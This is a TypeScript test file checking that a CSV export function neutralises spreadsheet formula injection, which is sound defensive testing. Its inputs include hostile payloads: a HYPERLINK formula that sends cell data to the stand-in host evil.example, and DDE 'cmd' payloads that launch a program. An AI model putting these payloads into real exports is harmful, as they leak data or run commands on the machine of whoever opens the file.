import { svCsvFormulaSafe, svToCsv } from './csv';

/**
 * CSV formula injection (1.0 release audit, H1).
 *
 * The data in an export comes from one user; the spreadsheet that evaluates it
 * belongs to another. Every case below is a real payload shape from the OWASP
 * "CSV Injection" write-up, or a value that must NOT be mangled by the fix.
 */
const cell = (v: string | number) => svToCsv(['h'], [[v]]).split('\r\n')[1];

describe('svToCsv — formula guard', () => {
  it.each([
    ['=HYPERLINK("https://evil.example/?d="&A2,"Click")'],
    ["=cmd|' /C calc'!A0"],
    ['+SUM(1+1)*cmd|\' /C calc\'!A0'],
    ['-2+3+cmd|\' /C calc\'!A0'],
    ['@SUM(1+1)'],
    ['\t=1+1'],
    ['\r=1+1'],
  ])('neutralises %j', (payload) => {
    const out = cell(payload);
    // The cell, once unquoted, starts with the apostrophe Excel shows as text.
    const unquoted = out.startsWith('"') ? out.slice(1, -1).replace(/""/g, '"') : out;
    expect(unquoted.startsWith("'")).toBe(true);
    expect(unquoted.slice(1)).toBe(payload);
  });

  it('applies to the header row too', () => {
    expect(svToCsv(['=1+1'], []).startsWith("'=1+1")).toBe(true);
  });

  it.each([
    [-12.5, '-12.5'],
    ['-12.5', '-12.5'],
    ['+44', '+44'],
    ['-3%', '-3%'],
    ['1,234.50', '"1,234.50"'],
    ['Ada Lovelace', 'Ada Lovelace'],
    ['a=b', 'a=b'],
    ['', ''],
  ])('leaves %j alone', (value, expected) => {
    expect(cell(value)).toBe(expected);
  });

  it('can be switched off for a file that is not meant for a spreadsheet', () => {
    expect(svToCsv(['h'], [['=1+1']], { formulaGuard: false }).split('\r\n')[1]).toBe('=1+1');
  });

  it('svCsvFormulaSafe is exported for hosts that build their own cells', () => {
    expect(svCsvFormulaSafe('=1')).toBe("'=1");
    expect(svCsvFormulaSafe('-1')).toBe('-1');
  });
});
